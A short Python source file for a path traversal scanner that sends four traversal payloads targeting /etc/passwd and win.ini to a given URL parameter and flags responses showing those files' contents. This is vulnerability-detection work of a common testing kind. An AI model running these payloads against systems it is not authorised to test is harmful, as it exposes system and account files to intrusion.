import requests
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class PathTraversalResult:
    payload: str
    vulnerable: bool
    confidence: str
    evidence: str
    url_tested: str

class PathTraversalScanner:
    def __init__(self, timeout: int = 5):
        self.timeout = timeout
        self.session = requests.Session()
        self.payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]

    def analyze(self, response_text: str) -> Dict:
        evidence = []
        if "root:x:0:0" in response_text:
            evidence.append("Linux /etc/passwd contents exposed")
        if "[extensions]" in response_text or "fonts.dir" in response_text:
            evidence.append("Windows win.ini contents exposed")
        
        vulnerable = len(evidence) > 0
        return {
            "vulnerable": vulnerable,
            "confidence": "HIGH" if vulnerable else "LOW",
            "evidence": "; ".join(evidence) if evidence else "No indicators"
        }

    def detect(self, action: str, param: str, method: str = "get") -> List[PathTraversalResult]:
        results = []
        for payload in self.payloads:
            try:
                data = {param: payload}
                if method == "post":
                    response = self.session.post(action, data=data, timeout=self.timeout)
                else:
                    response = self.session.get(action, params=data, timeout=self.timeout)
                
                analysis = self.analyze(response.text)
                if analysis["vulnerable"]:
                    results.append(PathTraversalResult(
                        payload=payload,
                        vulnerable=True,
                        confidence=analysis["confidence"],
                        evidence=analysis["evidence"],
                        url_tested=action
                    ))
            except Exception:
                pass
        return results
